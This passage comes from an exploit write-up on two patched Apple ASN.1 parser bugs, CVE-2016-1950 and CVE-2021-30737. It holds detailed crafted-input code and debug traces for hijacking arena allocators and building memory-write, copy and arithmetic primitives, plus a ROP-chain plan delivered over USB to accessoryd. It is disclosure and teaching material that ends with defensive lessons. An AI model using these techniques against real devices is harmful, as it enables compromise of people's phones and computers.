+        allocate = 0
+        indefinite = 0
+    sec_asn1d_parse_leaf: memcpy(0x7fe419006e20 + 8688 = 0x7fe419009010, "4141414141414150", 16)
+    sec_asn1d_parse_leaf: pre-existing value = 0x7fe419009827
+    ...
+
+In effect, this means we are replacing Arena `limit/avail` with whatever
+memory range we want, and then any further allocations will happen there.
+We can again resort to a scratch area which will become our allocation
+playground.
+
+This approach of hijacking the Arena is probabilistic. Synthetic benchmarks
+showed pretty good success rate -- around 30-40% -- so it may be that in a
+real world scenario that would be somewhere up to 20%. Not exactly bad, but
+not very good either. Debugging will be a royal pain in the ass but that's
+not even terribly important; the success rate will be reduced even further
+by whatever assumptions we may have to make down the road.
+
+The hangover was still raging the day after the next one. I'll never drink
+again! (that's probably a lie)
+
+-- 4.1 - Dance, little bunny!
+
+The less-than-stellar success rate is kinda bothersome, let's see if we can
+do better. We have two pools of Arenas: `their_pool` and `our_pool`. The
+former holds destination structures (aka `dest`) and the final values of
+the parsing process (the reassembled bitstring from its constituents). The
+latter holds intermediate values (eg: substrings) and state objects.
+
+All Arenas have a default size of `SEC_ASN1_DEFAULT_ARENA_SIZE`=2048, with
+the exception of the first `their_pool` Arena, which is 1024. Our bitstring
+will ultimately exceed 2048, therefore we are guaranteed the arena code has
+already depleted whatever Arena was active when entering the bitstring. It
+means when the time comes to allocate a new `dest` it will happen inside a
+fresh `their_pool` Arena.
+
+Let's try to forcibly deplete `our_pool` Arena, too. This process will not
+change the existing `dest`.
+
+    CONS_BITSTRING(len);
+
+        // len must be >= 2048, so that their_pool is already depleted.
+        // Now consume our_pool. We want to switch to a fresh Arena right
+        // after we generate a new 'dest'
+        for (unsigned k = 0; k < 8; k++) {
+            CONS_BITSTRING(3);
+                START_BITSTRING(0, 0);
+        }
+
+This process of creating empty objects has the net effect of consuming
+`our_pool` without taking up too much space in the input. Side-note: the
+empty bitstrings above are harmless, because they are not followed by any
+other primitive substring component and therefore they will not trigger the
+bug. Yet. At this point we have the guarantee that both pools are depleted.
+Now we trigger the bug, overwriting the currently active state object:
+
+        // (continued)
+        START_BITSTRING(0, 0);
+        CONS_BITSTRING(3 + 5);
+            REP_BITSTRING(0, 5, 'a');
+        // leave the pointer dangling over 'place'
+        REP_BITSTRING(0, FILLER_LEN + 6 * 8, 'b');
+        // Change 'place', 'pending' and a bunch of other fields
+        CONS_BITSTRING(len); // extend this construct to the end
+            START_BITSTRING(0, 92);
+                PUSH4(5);         // place: afterLength
+                PUSH4(0x20);      // found_tag_modifiers: SEC_ASN1_CONSTRUCTED
+                PUSH8(0xdfULL);   // check_tag_mask
+                PUSH8(3ULL);      // found_tag_number
+                PUSH8(3ULL);      // expect_tag_number
+                PUSH8(3ULL);      // underlying_kind
+                PUSH8(0ULL);      // contents_length: 0
+                PUSH8(1ULL + 92); // pending: +1
+                PUSH8(3ULL);      // consumed
+                PUSH4(9);         // depth
+                PUSH4(0);         // bit_string_unused_bits
+                PUSH8(0ULL);      // subitems_head
+                PUSH8(0ULL);      // subitems_tail
+                PUSH3(1);         // allocate: 1
+                PUSH1(1);         // indefinite: 1
+
+We make some select changes to the state object, while keeping unchanged
+the values we don't need. Let's highlight the changes made to the object:
+
+    place = afterLength
+
+because we want to go straight to `sec_asn1d_prepare_for_contents`. But we
+must dodge `sec_asn1d_parse_leaf` tail switching to `beforeEndOfContents`,
+and so we also need:
+
+    pending = whatever it was before (92) + 1
+
+Once we reach `sec_asn1d_prepare_for_contents`, we have:
+
+    allocate = TRUE
+
+and therefore a new `dest` will be allocated in `their_pool`. Since that
+pool is already empty, we guarantee that the new `SecAsn1Item` will be the
+first thing in a new `their_pool` Arena. We will hit an assert because we
+are not supposed to be here unless `dest` was already NULL. We could set
+it to NULL with our bug, however, that means we would need to obliterate
+the `parent`, which raises further issues. While this is probably fixable,
+we won't be concerning ourselves with it, because the assert does not exist
+in Release binaries.
+
+Later on, `contents_length` comes into play, and it works best for us if:
+
+    contents_length = 0
+
+This allows us to clear the `pending` field and skip further allocations.
+Finally, having also set:
+
+    indefinite = TRUE
+
+we dodge again `afterEndOfContents`. The last piece clicks in place with:
+
+    found_tag_modifiers = SEC_ASN1_CONSTRUCTED
+
+which switches to `duringConstructedString` then pushes a new state. This
+new state gets allocated right at the beginning of `our_pool` Arena because
+we already depleted the old one. At this point, the pools look like this:
+
+                    state->dest ---------+
+                                         v
+    T: [next=0x0] [base] [limit] [avail] [Length=0x0, Data=NULL]
+                  |                      ^
+                  +----------------------+
+
+    O: [next=0x0] [base] [limit] [avail] [state]
+
+And then we follow-up with our old friend: trigger the bug again, without
+leaving the parent construct. Since `dest` is the first block sliced from
+`their_pool` Arena, shaving off its LSB will reroute `dest` to the Arena
+structure itself. This results in a type confusion: Arena `next` and `base`
+acting like a `SecAsn1Item` pointing to the old `dest`. We now trigger a
+write of eight zeroes followed by one 0x10 byte, effectively keeping the
+`dest->Length` to 0 and doing a partial overwrite over `dest->Data`, making
+the old `dest` point to `&Arena.limit`. Finally, having popped back the old
+`dest` we are now free to overwrite the Arena:
+
+            // (continued)
+            START_BITSTRING(0, 0);
+            CONS_BITSTRING(3 + 5);
+                REP_BITSTRING(0, 5, 'c');
+            // leave the pointer dangling over 'dest'
+            REP_BITSTRING(0, FILLER_LEN + 2 * 8, 'd');
+            // temporarily make 'dest' overlap with their_pool Arena, by shaving off the LSB
+            CONS_BITSTRING(3 + 1 + 3 + 9);
+                // relocate 'dest' -> PLArena
+                START_BITSTRING(0, 1);
+                    PUSH1(0); // LSB = 0
+                // 'dest' is pointing to previous self, shave off the LSB of Data
+                START_BITSTRING(0, 9);
+                    PUSH8(0ULL); // Length
+                    PUSH1(0x10); // LSB = 0x10
+            // 'dest' is popped back, with dest->Data pointing to our_pool Arena.limit
+            START_BITSTRING(0, 16);
+                PUSH8(0x4141414141414150); // limit
+                PUSH8(0x4141414141414140); // avail
+
+If that looks confusing it's because it really is. Perhaps some pictures
+can clear it up.
+
+After the break and the 'c' segment:
+
+                    state->dest ---------+
+                                         v
+    T: [next=0x0] [base] [limit] [avail] [Length=0x0, Data]
+                  |                      ^            |
+                  +----------------------+            +----------+
+                                                                 v
+    O: [next=0x0] [base] [limit] [avail] [state] [block(sz=1/8)] [block(8)]
+
+After the 'd' segment, shave off `dest` LSB:
+
+       +------------- state->dest
+       v
+    T: [next=0x0] [base] [limit] [avail] [Length=0x0, Data]
+                  |                      ^            |
+                  +----------------------+            +----------+
+                                                                 v
+    O: [next=0x0] [base] [limit] [avail] [state] [block(sz=1/8)] [block(8)]
+
+Zero `dest->Length` and set `dest->Data` LSB = 0x10:
+
+       +------------- state->dest
+       v
+    T: [next=7*8] [base] [limit] [avail] [Length=0x0, Data]
+                  |                      ^            |
+                  +----------------------+            |
+                         +----------------------------+
+                         v
+    O: [next=0x0] [base] [limit] [avail] [state] [block(sz=1/8)] [block(8)]
+
+After popping `dest`, smash `our_pool` Arena `limit/avail`:
+
+                    state->dest ---------+
+                                         v
+    T: [next=7*8] [base] [limit] [avail] [Length=128, Data]
+                  |                      ^            |
+                  +----------------------+            |
+                         +----------------------------+
+                         v
+    O: [next=0x0] [base] [ END ] [BEGIN] [state] [block(sz=1/8)] [block(8)]
+
+Woo-hooo! We just hijacked the current `our_pool` Arena. Where to? Well, to
+our old friend, the scratch area. Once we are rocking the Arena at a known
+address inside the victim space, we can predict absolutely all subsequent
+allocations. Determining such a scratch address is again a matter of vmmap
+and observing where the writable allocations end up. Refer to the attached
+source code READMEs for more info.
+
+NB: 0x4b4b4b4b4b4b4b.. in the examples below are all known addresses inside
+the scratch area and can be presumed known/constant.
+
+-- 4.2 - He who controls the Arena
+
+Hijacking the Arena in a predictable manner is a big win but it proves to
+be a much more complex process than it was before CVE-2016-1950 got fixed.
+Unlike the old way, where we could create new Arenas out of thin air at the
+snap of the fingers, this time we should keep a grip on the one we just got
+a hold of. For this reason we abandon our MAKE_ARENA/WRITE contraptions and
+switch to a different paradigm for achieving write-anywhere.
+
+Having the Arena in the scratch space means that we know where everything
+is laid out. We first generate whatever items we need right at the top of
+our newly built Arena and then use the bug repeatedly to route `dest` to
+them, in order to perform the writes. This is easy since we know the exact
+address of each item. Example:
+
+    START_BITSTRING(0, 0);
+    START_BITSTRING(0, 16);
+        // SecAsn1Item:
+        PUSH8(0ULL); // Length
+        PUSH8(0x4343434343434343); // Data: WHERE we are writing
+
+    // repeat the evil scheme
+    START_BITSTRING(0, 0);
+    CONS_BITSTRING(3 + 5);
+        REP_BITSTRING(0, 5, 'f');
+    // leave the pointer dangling over 'dest'
+    REP_BITSTRING(0, FILLER_LEN + 2 * 8, 'f');
+    // reroute 'dest' and perform the write
+    CONS_BITSTRING(3 + 8 + 3 + 8);
+        // 'dest' -> &SecAsn1Item = { 0, destination }
+        START_BITSTRING(0, 8);
+            PUSH8(0x4b4b4b4b4b4b4b42); // &SecAsn1Item
+        // write
+        START_BITSTRING(0, 8);
+            PUSH8(0x4646464646464646); // WHAT we are writing
+
+Replace 0x4b4b4b4b4b4b4b42 with the exact address of the `SecAsn1Item`, as
+we know it in advance (it's right at the top of the scratch space), and the
+code above will perform:
+
+    *(uint64_t *)0x4343434343434343 = 0x4646464646464646;
+
+At this point, our new bug is as capable as the old one: writing static
+values at known addresses. However, one thing that was kinda bothersome
+about the old exploit was that it was comprised of multiple steps and it
+was relying on some difficult to guess stack address. Can we do this one
+in a single step? Let's examine the richness of the decoding machinery and
+see what kind of primitives it has to offer.
+
+-- 4.2.0 - Copyout
+
+By copyout, we mean the ability to copy any value from the scratch space to
+any arbitrary address. `sec_asn1d_concat_substrings` can copy from subitems
+into a new `their_pool` allocation. The relevant code in secasn1d.c is:
+
+    where = item->Data;
+    substring = state->subitems_head;
+    while (substring != NULL) {
+        if (is_bit_string)
+            item_len = (substring->len + 7) >> 3;
+        else
+            item_len = substring->len;
+        PORT_Memcpy (where, substring->data, item_len);
+        where += item_len;
+        substring = substring->next;
+    }
+
+While we decided to never mess again with `our_pool` Arenas, that doesn't
+apply to `their_pool` Arenas. As long as we stay under the mega-object used
+for the initial hijack, `their_pool` will never be used by the decoder. It
+means we can freely play with that pool and the easiest way to achieve this
+is to create a completely new pool and replace it:
+
+    // reserve a bunch of subitems, items, PORTArenaPool and objects
+    START_BITSTRING(0, 0);
+    START_BITSTRING(0, 24 + 24 + 8 * 8 + 7);
+        // subitem
+        PUSH8(0x4b4b4b4b4b4b4b41); // data: where we are copying out FROM
+        PUSH8(8ULL << 3); // len
+        PUSH8(0ULL); // next
+        // subitem
+        PUSH8(0x4545454545454545); // data: where we are copying in FROM
+        PUSH8(8ULL); // len
+        PUSH8(0ULL); // next
+        // PORTArenaPool
+        PUSH8(0); // PORTArenaPool.arena.first.next (NULL, but could be chained)
+        PUSH8(0ULL); // PORTArenaPool.arena.first.base
+        PUSH8(0x4141414141414170); // PORTArenaPool.arena.first.limit
+        PUSH8(0x4141414141414160); // PORTArenaPool.arena.first.avail (copyout DESTINATION)
+        PUSH8(0x4b4b4b4b4b4b4b48); // PORTArenaPool.arena.current = &PORTArenaPool.arena
+        PUSH8(256ULL); // PORTArenaPool.arena.arenasize
+        PUSH8(7ULL); // PORTArenaPool.arena.mask
+        PUSH8(0xB8AC9BDFULL); // PORTArenaPool.magic
+        // this serves as overlapping SecAsn1Item with 'top' below
+        PUSH7(8ULL << 3); // Length: 8
+    // state (promptly discarded)
+    CONS_BITSTRING(3);
+        START_BITSTRING(0, 0);
+
+The scratch space will have the following layout:
+
+                                        |<-- real state object -->|
+                                        |                         |
+    [subitem] [PORTArenaPool] [   8   ] [top] [template] [dest] ...
+                              |             |
+                              |< fake item >|
+
+The overlapping item is `{ 8, top }` and we can use our write primitive to
+replace `top->their_pool` with our own `PORTArenaPool`. Once we have that,
+all subsequent allocations in `their_pool` will be controlled by us. We can
+even chain multiple Arenas in `PORTArenaPool` and, if sized correctly, they
+will perform different controlled writes with little to no effort. First,
+we replace `their_pool`:
+
+        START_BITSTRING(0, 0);
+        CONS_BITSTRING(3 + 5);
+            REP_BITSTRING(0, 5, 'f');
+        REP_BITSTRING(0, FILLER_LEN + 2 * 8, 'f'); // leave the pointer dangling over 'dest'
+        CONS_BITSTRING(3 + 8 + 3 + 8);
+            START_BITSTRING(0, 8);
+                PUSH8(0x4b4b4b4b4b4b4b42); // 'dest' -> &SecAsn1Item = { 8, state#1->top }
+            START_BITSTRING(0, 8);
+                PUSH8(0x4b4b4b4b4b4b4b48); // &PORTArenaPool
+
+0x4b4b4b4b4b4b4b42 is the address of the fake SecAsn1Item, consisting of a
++8 byte offset and `top` as base.
+
+0x4b4b4b4b4b4b4b48 is our full PORTArenaPool replacement for `their_pool`,
+consisting of a new Arena: [0x4141414141414160 .. 0x4141414141414170]. It
+represents the copyout destination. This replacement step must be performed
+once, followed by the actual copyout:
+
+    // cause a state object allocation with known parent
+    CONS_BITSTRING(3 + FILLER_LEN + 112 + 38);
+        START_BITSTRING(0, 0);
+        CONS_BITSTRING(3 + 5);
+            REP_BITSTRING(0, 5, 'g');
+        REP_BITSTRING(0, FILLER_LEN + 2 * 8, 'g'); // leave the pointer dangling over 'dest'
+        // switch to 'afterConstructedString' and trigger a copyout from subitem via sec_asn1d_concat_substrings
+        CONS_BITSTRING(3 + 112);
+            START_BITSTRING(0, 112);
+                PUSH8(0x4b4b4b4b4b4b4b4b); // dest: any { 0, NULL }
+                PUSH8(0ULL);               // our_mark
+                PUSH8(0x4b4b4b4b4b4b4b4c); // parent: previous object
+                PUSH8(0ULL);               // child
+                PUSH8(13ULL);              // place: afterConstructedString
+                PUSH8(0xdfULL);            // check_tag_mask
+                PUSH8(3ULL);               // found_tag_number
+                PUSH8(3ULL);               // expect_tag_number
+                PUSH8(3ULL);               // underlying_kind
+                PUSH8(1ULL + 112);         // contents_length
+                PUSH8(1ULL + 112);         // pending: +1
+                PUSH8(3ULL);               // consumed
+                PUSH4(11);                 // depth
+                PUSH4(0);                  // bit_string_unused_bits
+                PUSH8(0x4b4b4b4b4b4b4b4d); // subitems_head: &subitem
+
+0x4b4b4b4b4b4b4b4b must point to a temporary empty `dest`. This is needed
+to dodge some assertions. Not quite mandatory, because the assertions are
+missing from the Release binaries, I'm just being pedantic.
+
+0x4b4b4b4b4b4b4b4c must be the parent of the object we are manipulating. It
+is placed at a known address.
+
+0x4b4b4b4b4b4b4b4d is the subitem (or head of a subitem chain) which points
+to the source data.
+
+The net effect of the code above is:
+    memcpy(0x4141414141414160, 0x4b4b4b4b4b4b4b41, 8);
+
+If multiple copyouts are desired, we can chain the subitems and also chain
+the initial PORTArenaPool to other PLArena structures.
+
+In contrast to the previous chapters' primitives, this allows us to copy
+whatever data into the destination, not merely scalar values. And we did it
+without overly complicated contraptions to pivot the input buffer. Looking
+back at the old code I cannot stop wondering what the fuck was I thinking
+back then. It is a total garbage.
+
+-- 4.2.1 - Copyin
+
+The copyin is a bit different. It represents the ability to copy data from
+any arbitrary address into local scratch space. This can be achieved with
+`sec_asn1d_prepare_for_contents`. We can't exactly tell where to copy to,
+but this is just a minor inconvenience, because said data is copied into a
+new `our_pool` allocation, which is inside the scratch space, hence we can
+calculate where it will end up:
+
+    if (item) {
+        item->Data = (unsigned char*)sec_asn1d_zalloc(poolp, alloc_len);
+    }
+
+    len = 0;
+    for (subitem = state->subitems_head;
+        subitem != NULL; subitem = subitem->next) {
+        PORT_Memcpy (item->Data + len, subitem->data, subitem->len);
+        len += subitem->len;
+    }
+    item->Length = len;
+
+Here's how to trigger it:
+
+    // cause a state object allocation with known parent
+    CONS_BITSTRING(3 + FILLER_LEN + 112 + 38);
+        START_BITSTRING(0, 0);
+        CONS_BITSTRING(3 + 5);
+            REP_BITSTRING(0, 5, 'i');
+        REP_BITSTRING(0, FILLER_LEN + 2 * 8, 'i'); // leave the pointer dangling over 'dest'
+        // switch back to 'afterLength' and trigger a copyin from subitem via sec_asn1d_prepare_for_contents
+        CONS_BITSTRING(3 + 112);
+            START_BITSTRING(0, 112);
+                PUSH8(0x4b4b4b4b4b4b4b4f); // dest: any { 0, NULL }
+                PUSH8(0ULL);               // our_mark
+                PUSH8(0x4b4b4b4b4b4b4b50); // parent: previous object
+                PUSH8(0ULL);               // child
+                PUSH8(5ULL);               // place: afterLength
+                PUSH8(0xdfULL);            // check_tag_mask
+                PUSH8(3ULL);               // found_tag_number
+                PUSH8(3ULL);               // expect_tag_number
+                PUSH8(0x400ULL);           // underlying_kind: SEC_ASN1_ANY
+                PUSH8(0ULL);               // contents_length: 0
+                PUSH8(1ULL + 112);         // pending: +1
+                PUSH8(3ULL);               // consumed
+                PUSH4(11);                 // depth
+                PUSH4(0);                  // bit_string_unused_bits
+                PUSH8(0x4b4b4b4b4b4b4b47); // subitems_head: &subitem
+
+0x4b4b4b4b4b4b4b4f must point to a temporary empty `dest`. This is needed
+to make sure the copyin is done at the next available `our_pool` address,
+which can be calculated and therefore it is considered known.
+
+0x4b4b4b4b4b4b4b50 must be the parent of the object we are manipulating. It
+is placed at a known address.
+
+0x4b4b4b4b4b4b4b47 is the subitem (or head of a subitem chain) which points
+to the address to read from. The data will be placed at the next available
+address in the scratch space.
+
+The net effect of the code above is:
+    memcpy(next_alloc(our_pool), 0x4545454545454545, 8);
+
+And since `our_pool` is pinned to the scratch space, we can calculate where
+the destination will be.
+
+-- 4.2.2 - Arithmetic
+
+Arithmetic represents the ability to do some sort of addition/subtraction.
+Since we want to avoid a multi-step exploit and perform everything in one
+go, we need to work out some shared cache addresses. For example, if we'd
+want to find the address of `vm_remap` function, we can simply execute the
+following equivalent operation:
+
+    vm_remap = &kSecAsn1BitStringTemplate + addend;
+
+The addend above is constant for a given shared cache and can be calculated
+beforehand. The addition itself is done in `sec_asn1d_next_substring`. In
+case it is not obvious, the relevant code is this:
+
+    state->consumed += child_consumed;
+
+The operation is done by using two discarded state objects. First make sure
+`child->consumed` holds the addend (this is a matter of a simple write) and
+then use a copyout to set `state->consumed` to `kSecAsn1BitStringTemplate`.
+After the operation, `state->consumed` holds the result of the addition.
+
+    START_BITSTRING(0, 16);
+        // SecAsn1Item
+        PUSH8(0ULL); // Length
+        PUSH8(0x4b4b4b4b4b4b4b41); // Data: &state#1->our_mark
+
+    // state#1 (promptly discarded)
+    CONS_BITSTRING(3 + 2); // Vader
+        // state#2 (promptly discarded)
+        CONS_BITSTRING(3); // Zon
+            START_BITSTRING(0, 0);
+
+    // Use SecAsn1Item to prepare state#1 and state#2.
+
+    START_BITSTRING(0, 0);
+    CONS_BITSTRING(3 + 5);
+        REP_BITSTRING(0, 5, 'e');
+    REP_BITSTRING(0, FILLER_LEN + 2 * 8, 'e'); // leave the pointer dangling over 'dest'
+    CONS_BITSTRING(3 + 8 + 4 + 232);
+        START_BITSTRING(0, 8);
+            PUSH8(0x4b4b4b4b4b4b4b49); // 'dest' -> &SecAsn1Item = { 0, &state#1->our_mark }
+        START_BITSTRING(0, 232);
+            PUSH8(-1ULL);              // our_mark: -1
+            PUSH8(0x4b4b4b4b4b4b4b4a); // parent: where we want to resume
+            PUSH8(0x4b4b4b4b4b4b4b4b); // child: &state#2
+            PUSH8(8ULL);               // place: duringConstructedString
+            PUSH8(0xdfULL);            // check_tag_mask
+            PUSH8(3ULL);               // found_tag_number
+            PUSH8(3ULL);               // expect_tag_number
+            PUSH8(3ULL);               // underlying_kind
+            PUSH8(1ULL);               // contents_length
+            PUSH8(0x4242424242424242); // pending: ADDEND
+            PUSH8(0ULL);               // consumed: POINTER
+            PUSH8(0x4b4b4b4b4b4b4b51); // depth...: serve as arg = &string
+            PUSHR(0x80, 0);            // (bleed over into state#2)
+            PUSH8(0x4242424242424242); // consumed: ADDEND
+
+    // Insert here copyout of any state->theTemplate to &state#1->consumed,
+    // where the POINTER is expected to be.
+    ...
+    // And here follows the addition per se:
+
+    // cause a state object allocation with known parent
+    CONS_BITSTRING(3 + FILLER_LEN + 8 + 51);
+        START_BITSTRING(0, 0);
+        CONS_BITSTRING(3 + 5);
+            REP_BITSTRING(0, 5, 'h');
+        REP_BITSTRING(0, FILLER_LEN + 4 * 8, 'h'); // leave the pointer dangling over 'parent'
+        // switch to 'duringConstructedString' and trigger addition via sec_asn1d_next_substring
+        CONS_BITSTRING(3 + 8);
+            START_BITSTRING(0, 8);
+                PUSH8(0x4b4b4b4b4b4b4b4e); // parent: state#1
+
+We can chain multiple state#1/state#2 pairs to perform multiple additions
+in one go, with one addend for each pair. The last object used for addition
+must have its parent pointing back to the object we left off.
+
+                +-----------------------------------------------+
+                v                                               |
+            +---------------------+   +--------------------+    |
+            |   discarded obj     |-->|   discarded obj    |    |
+            | state#1[n] = parent |   | state#2[n] = child |    |
+            +---------------------+   +--------------------+    |
+                |           ^              |                    |
+                |           +- addition#n -+                    |
+                ~                                               ~
+                |                                               |
+                v                                               |
+            +---------------------+   +--------------------+    |
+            |   discarded obj     |-->|   discarded obj    |    |
+            | state#1[1] = parent |   | state#2[1] = child |    |
+        |   +---------------------+   +--------------------+    |
+        |       |           ^              |                    |
+        |       |           +- addition#1 -+                    |
+        v       v                                               |
+    +-------------+                                             |
+    |   parent    |------+                                      |
+    +-------------+      |                                      |
+        |    ^           v                                      |
+        |    |     +------------+                               |
+        |    +--X--|YOU ARE HERE|-------------------------------+
+        |          +------------+
+        v
+
+Here we see state 0x102b627f0 transitioning to 102b62198 which performs the
+addition, and then transitioning back to 0x102b626c8 and resuming execution
+normally:
+
+    sec_asn1d_parse_leaf: memcpy(0x102b62758 + 5 = 0x102b6275d, "6868686868686868", 179)
+    sec_asn1d_parse_leaf: pre-existing value = 0x867b806a20000000
+    STATE transition 0x102b626c8 -> 0x7f867b80b620
+    STATE transition 0x7f867b80b620 -> 0x102b626c8
+    sec_asn1d_push_state:430: zalloc(144) -> 0x102b627f0 in arena o_pool/0x0 (left -1)
+    STATE transition 0x102b626c8 -> 0x102b627f0
+    sec_asn1d_parse_leaf: len=2401, @1953
+    sec_asn1d_parse_leaf: item = BIT_STRING, item->len = 1472, len = 8
+    state = 0x102b627f0
+        top = 0x7f867b806a20
+        theTemplate = 0x102b7b2e0
+        dest = 0x7f867b809620
+        our_mark = 0x0
+        parent = 0x102b626c8
+        contents_length = 9
+        pending = 8
+        consumed = 3
+        depth = 12
+        allocate = 0
+        indefinite = 0
+    sec_asn1d_parse_leaf: memcpy(0x102b62758 + 184 = 0x102b62810, "102b62198", 8)
+    sec_asn1d_parse_leaf: pre-existing value = 0x102b626c8
+    STATE transition 0x102b627f0 -> 0x102b62198
+    STATE transition 0x102b62198 -> 0x102b626c8
+    STATE transition 0x102b626c8 -> 0x7f867b80b620
+    STATE transition 0x7f867b80b620 -> 0x7f867b809328
+    STATE transition 0x7f867b809328 -> 0x7f867b80b620
+    STATE transition 0x7f867b80b620 -> 0x7f867b809328
+    STATE transition 0x7f867b809328 -> 0x7f867b80b620
+
+-- 4.3 - Assembling the pieces
+
+The last missing bit is achieving code execution. This can be done the same
+way we did in the old exploit, using `top->filter_proc(top->filter_arg)`.
+Bypassing PAC is considered a security bug in its own right, this writeup
+is meant to illustrate strictly the ASN.1 bugs. As a consequence, defeating
+other mitigations than ASLR is left as an exercise to the reader.
+
+Now that we have all pieces, we are ready to build the exploit, using the
+following strategy:
+- use a number of copyouts to place a small number of template pointers in
+  the expected object pairs, prepared for addition;
+- perform a series of pointer arithmetic to compute the respective number
+  of gadgets;
+- use a chained copyin to assemble certain data fragments interleaved with
+  the aforementioned gadgets, effectively building a bootstrap ROP strip;
+- copyout a JOP gadget over `top->filter_proc` and the address of said ROP
+  strip over `top->filter_arg`, which will pivot the stack;
+- the bootstrap ROP strip does the following:
+    - vm_remap the shared cache at a fixed address;
+    - jump to stage2 relocator, which relocates the rest of stage2, using
+      only gadgets from the remapped cache;
+    - enter late stage2 which has full ROP functionality.
+
+Of course, this is but one way of doing it. Please keep in mind that our
+primitives are quite expensive in terms of bitstring space, and therefore
+we aim to complete the chain with minimal effort.
+
+Finally, we "relocate" the PKCS#7 for whichever address we believe it would
+be a viable scratch space. Relocating means translating all those addresses
+we know about: 0x4b4b4b4b4b4b4b... The result will be sent over USB as an
+IAP2 authentication packet to accessoryd, using whatever MFi tool. Note: we
+do not need a real IAP certificate, because the exploit kicks in before the
+certificate is even validated and it does everything in one go.
+
+If we miss, accessoryd will likely crash and we may need to restore the USB
+connection. Then we can build another PKCS#7 (for another address) or just
+keep retrying the old one. Eventually, one of them is bound to hit a usable
+scratch address and succeed. Note: these daemons listening over USB are not
+throttled. Also, it makes no difference if the shared cache is reslid upon
+daemon restart, since we have the ability to recalculate the gadgets during
+each retry.
+
+The only thing that matters is to reach a writable scratch area we can use.
+It does not matter what this area contains, and it does not have to be at a
+specific address. It just has to be. Everything is computed during decoding
+with the aid of the hijacked ASN.1 machinery, provided it has a little bit
+of manoeuvring space.
+
+-- 5 - Conclusions
+
+This article has begun in Spring 2021, its main purpose was to detail the
+CVE-2016-1950 exploit. But as I was writing, trying hard to remember five
+years old details, I realised the exploit used two bugs: one that was fixed
+and the other one (which I completely forgot about) that was still there.
+I knew it was somehow exploitable on its own, so I reported it to Apple, on
+16 April 2021. It was fixed in iOS 14.6 beta 3 (18F5065a) dated 10 May 2021
+and it would later become CVE-2021-30737[7] of iOS 14.6 (18F72) release. It
+was also backported to iOS 12.5.4 for end-of-life devices.
+
+An interesting side-note: to my knowledge, Apple started to use Mozilla NSS
+ASN.1 parser in MacOSX Panther, 2003: SecurityNssAsn1-11.tar.gz. And while
+CVE-2016-1950 was inherited from the original codebase, CVE-2021-30737 was
+never in Mozilla code; it seems to be an Apple-only addition. I do not know
+what was the purpose of the change, perhaps they wanted to take a shortcut
+for empty bitstrings for speed reasons, I guess we will never know.
+
+Here ends our journey into the ASN.1 parser vulnerabilities. CVE-2016-1950
+has been fixed in iOS 9.3 and CVE-2021-30737 was fixed in iOS 14.6, five
+years later. Both bugs affected virtually all Apple products: iPhone, iPad,
+Macs, etc. While the two bugs are completely unrelated, it may be that the
+former can be turned into an exploit without the latter. I never tried to
+do it that way. What we know now is the old bug greatly helped the newer
+one -- but as we can see, CVE-2021-30737 was powerful enough to carry the
+weight of a full exploit on its own.
+
+These bugs are interesting because they can be used to mount a full attack
+against daemons listening on the phone Before First Unlock over USB. This
+means pretty much game over for 32bit devices, since those do not have SEP.
+On 64bit devices, however, the exploit can be used as a starting point for
+further exploration.
+
+Another interesting aspect is that a sizeable part of these exploits, that
+is, everything we accomplish with the bitstring is architecture agnostic,
+only the bitness matters. For example, the resulting bitstrings can be
+tested on x86_64 and then used on arm64. Ditto for i386 vs armv7.
+
+Last, but not least, there are some lessons to be learned. First of all,
+you should never use an Arena allocator in security sensitive contexts.
+Yes, Arenas are fast, easy to implement from a programmer point of view
+and they seem appealing. They can also get you pwned, because the memory
+blocks are laid out in a predictable fashion. Actually, to be more blunt,
+stay the fuck away from any kind of allocator with inline meta-data.
+
+Second, BER is a hairy beast. BER parsers tend to become extremely complex
+and complexity is the enemy of security. If you must handle ASN.1, use DER
+whenever possible. There are examples of alloc-less DER parsers which do a
+pretty good job and seem very secure when used properly, such as libDER.
+
+Third, never ever mess with complex state machines that you do not fully
+understand. All the assertions were useless, with one notable exception
+(which may or may not be possible to dodge) so even if they were left in
+the Release binaries, it didn't matter greatly. State machines are hard!
+Human brains are great for many things, but state machines is definitely
+not one of those.
+
+-- 6 - References
+
+[0] https://support.apple.com/en-us/HT206166
+[1] https://en.wikipedia.org/wiki/ASN.1
+[2] https://opensource.apple.com/release/os-x-10114.html
+[3] https://en.wikipedia.org/wiki/Region-based_memory_management
+[4] https://tools.ietf.org/html/rfc3369
+[5] https://www.cvedetails.com/cve/CVE-2016-4656/
+[6] https://www.cvedetails.com/cve/CVE-2016-4655/
+[7] https://support.apple.com/en-us/HT212528
+
+-- 7 - Source code
+
+The source code was designed to work on iPhones, but it happens to work on
+macOS, too. Make sure you respect the bitness and use the correct libraries
+for each of the included examples: Security-57337.20.44 for the first bug
+and Security-59754.80.3 for the second one.
